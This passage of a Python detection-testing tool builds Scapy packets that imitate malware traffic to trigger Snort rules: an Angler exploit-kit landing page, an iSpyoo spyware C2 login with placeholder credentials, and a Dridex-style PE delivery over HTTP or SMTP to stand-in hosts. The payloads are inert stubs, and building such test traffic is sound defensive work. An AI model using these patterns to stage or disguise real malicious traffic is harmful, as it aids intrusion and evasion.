                    "compromised_ip": compromised_ip,
                    "c2_ip": c2_ip,
                    "snort_sid": "18459",
                    "mitre_technique": "T1071.001",
                    "keepalive_index": i + 1,
                },
            )

            current_time += interval_ms


@register_action("angler_ek_landing")
def _angler_ek_landing(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:32390 - Angler Exploit Kit landing page.

    **Snort Rule**::

        alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (
            msg:"EXPLOIT-KIT Angler exploit kit landing page detected";
            flow:to_client,established;
            http_header;
            content:"Last-Modified|3A| Sat, 26 Jul 2040 05|3A|00|3A|00";
            sid:32390;
        )

    **Pattern**:
    - HTTP response from server
    - Last-Modified header with anomalous future date: "Sat, 26 Jul 2040 05:00:00"
    - Pattern: ``Last-Modified: Sat, 26 Jul 2040 05:00:00``

    **Parameters**:
    - serve_count (int): Number of landing pages served (default: 5)
    - interval_ms (int): Interval between serves (default: 30000)

    **Expected Detection**: Angler Exploit Kit temporal anomaly in Last-Modified header
    """
    serve_count = params.get("serve_count", 5)
    interval_ms = params.get("interval_ms", 30000)

    current_time = start_time_ms

    for target in targets:
        victim_ip = target.ip_address  # Victim requesting page
        ek_server_ip = params.get("ek_server_ip", "198.51.100.21")

        logger.info(
            f"Generating Angler EK landing page from {ek_server_ip} to {victim_ip}"
        )

        for i in range(serve_count):
            src_port = 80
            dst_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # Angler EK landing page with anomalous future date in Last-Modified
            exploit_html = (
                "<html><head><script src='/exploit.js'></script></head>"
                "<body>Loading...</body></html>"
            )

            http_response = (
                f"HTTP/1.1 200 OK\r\n"
                f"Date: Wed, 11 Feb 2026 12:00:00 GMT\r\n"
                f"Last-Modified: Sat, 26 Jul 2040 05:00:00 GMT\r\n"  # Angler EK signature
                f"Server: Apache/2.4.41\r\n"
                f"Content-Type: text/html\r\n"
                f"Content-Length: {len(exploit_html)}\r\n"
                f"Connection: Keep-Alive\r\n"
                f"\r\n"
                f"{exploit_html}"
            )

            pkt = (
                Ether()
                / IP(src=ek_server_ip, dst=victim_ip)
                / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num)
                / Raw(load=http_response.encode())
            )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "angler_ek_landing",
                {
                    "victim_ip": victim_ip,
                    "ek_server_ip": ek_server_ip,
                    "snort_sid": "32390",
                    "mitre_technique": "T1189",  # Drive-by Compromise
                    "serve_index": i + 1,
                },
            )

            current_time += interval_ms


@register_action("ispyoo_auth")
def _ispyoo_auth(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:50438 - iSpyoo Android spyware authentication.

    **Snort Rule**::

        alert tcp any any -> any any (
            msg:"MALWARE-CNC Android.Trojan.iSpyoo authentication";
            flow:to_server,established;
            content:"POST"; http_method;
            content:"/authenticate.aspx"; http_uri;
            content:"username="; http_client_body;
            content:"password="; distance:0; http_client_body;
            content:"deviceid="; distance:0; http_client_body;
            sid:50438;
        )

    **Pattern**:
    - HTTP POST to ``/authenticate.aspx``
    - Form data containing: ``username=``, ``password=``, ``deviceid=``
    - Sequential in client body

    **Parameters**:
    - interval_ms (int): Auth attempt interval (default: 90000 = 90 seconds)
    - attempt_count (int): Number of attempts (default: 5)
    - target_path (str): Auth endpoint (default: "/authenticate.aspx")

    **Expected Detection**: iSpyoo Android spyware authentication
    """
    interval_ms = params.get("interval_ms", 90000)
    attempt_count = params.get("attempt_count", 5)
    target_path = params.get("target_path", "/authenticate.aspx")
    c2_server = params.get("c2_server", "ispyoo-c2.spyware.net")
    c2_ip = params.get("c2_ip", "198.51.100.22")

    current_time = start_time_ms

    for target in targets:
        compromised_ip = target.ip_address
        logger.info(
            f"Generating iSpyoo authentication from {compromised_ip} to {c2_server}"
        )

        for i in range(attempt_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # iSpyoo authentication with form fields
            device_id = "".join(random.choice("0123456789ABCDEF") for _ in range(16))
            form_data = f"username=victim@email.com&password=stolen123&deviceid={device_id}"

            http_request = (
                f"POST {target_path} HTTP/1.1\r\n"
                f"Host: {c2_server}\r\n"
                f"User-Agent: iSpyoo/2.5 (Android)\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(form_data)}\r\n"
                f"Connection: Keep-Alive\r\n"
                f"\r\n"
                f"{form_data}"
            )

            pkt = (
                Ether()
                / IP(src=compromised_ip, dst=c2_ip)
                / TCP(sport=src_port, dport=80, flags="PA", seq=seq_num, ack=ack_num)
                / Raw(load=http_request.encode())
            )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "ispyoo_auth",
                {
                    "compromised_ip": compromised_ip,
                    "c2_server": c2_server,
                    "c2_ip": c2_ip,
                    "device_id": device_id,
                    "snort_sid": "50438",
                    "mitre_technique": "T1071.001",  # Enterprise Web Protocols (was T1437.001 Mobile matrix - wrong for an IT/OT host)
                    "attempt_index": i + 1,
                },
            )

            current_time += interval_ms


@register_action("dridex_file_marker")
def _dridex_file_marker(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Trigger Snort rule sid:45932 - Dridex malware file marker.

    **Snort Rule**::

        alert tcp any any -> any any (
            msg:"MALWARE-CNC Win.Trojan.Dridex file marker detected";
            flow:to_server,established;
            file_data;
            content:"MZ"; depth:2;
            content:".coda"; distance:0;
            content:".crt"; distance:0;
            sid:45932;
        )

    **Pattern**:
    - PE file header (``MZ``)
    - Contains section name ``.coda``
    - Contains section name ``.crt``
    - Typical delivery via SMTP or HTTP

    **Parameters**:
    - interval_ms (int): Delivery interval (default: 180000 = 3 minutes)
    - delivery_count (int): Number of deliveries (default: 3)
    - delivery_method (str): Method (default: "http_download")

    **Expected Detection**: Dridex banking trojan PE file delivery
    """
    interval_ms = params.get("interval_ms", 180000)
    delivery_count = params.get("delivery_count", 3)
    delivery_method = params.get("delivery_method", "http_download")
    c2_server = params.get("c2_server", "dridex-drop.malware.net")
    c2_ip = params.get("c2_ip", "198.51.100.23")

    current_time = start_time_ms

    for target in targets:
        victim_ip = target.ip_address
        logger.info(
            f"Generating Dridex file marker delivery to {victim_ip} via {delivery_method}"
        )

        for i in range(delivery_count):
            src_port = random.randint(49152, 65535)
            seq_num = random.randint(1000000, 2000000)
            ack_num = random.randint(1000000, 2000000)

            # Minimal PE file structure with Dridex markers
            # MZ header + DOS stub + PE header + section headers (.coda, .crt)
            pe_header = b"MZ\x90\x00"  # MZ magic + partial DOS header
            dos_stub = b"\x00" * 60  # Simplified DOS stub
            pe_signature = b"PE\x00\x00"  # PE signature

            # Section headers (simplified)
            coda_section = b".coda\x00\x00\x00" + b"\x00" * 32  # .coda section header
            crt_section = b".crt\x00\x00\x00\x00" + b"\x00" * 32  # .crt section header

            # Construct fake PE file
            pe_file = pe_header + dos_stub + pe_signature + coda_section + crt_section
            pe_file += bytes(random.getrandbits(8) for _ in range(512))  # Padding

            if delivery_method == "http_download":
                http_response = (
                    f"HTTP/1.1 200 OK\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Disposition: attachment; filename=document.exe\r\n"
                    f"Content-Length: {len(pe_file)}\r\n"
                    f"\r\n"
                )

                payload = http_response.encode() + pe_file

                pkt = (
                    Ether()
                    / IP(src=c2_ip, dst=victim_ip)
                    / TCP(sport=80, dport=src_port, flags="PA", seq=seq_num, ack=ack_num)
                    / Raw(load=payload)
                )
            else:
                # SMTP attachment fallback
                smtp_data = (
                    f"DATA\r\n"
                    f"From: invoice@fake-company.com\r\n"
                    f"To: {victim_ip}\r\n"
                    f"Subject: Invoice Attached\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Transfer-Encoding: base64\r\n"
                    f"\r\n"
                ).encode() + pe_file + b"\r\n.\r\n"

                pkt = (
                    Ether()
                    / IP(src=c2_ip, dst=victim_ip)
                    / TCP(sport=25, dport=src_port, flags="PA", seq=seq_num, ack=ack_num)
                    / Raw(load=smtp_data)
                )

            yield _scapy_to_packet_event(
                current_time,
                pkt,
                "dridex_file_marker",
                {
                    "victim_ip": victim_ip,
                    "c2_server": c2_server,
                    "c2_ip": c2_ip,
                    "delivery_method": delivery_method,
                    "snort_sid": "45932",
                    "mitre_technique": "T1566.001",  # Phishing: Spearphishing Attachment
                    "delivery_index": i + 1,
                },
            )

            current_time += interval_ms
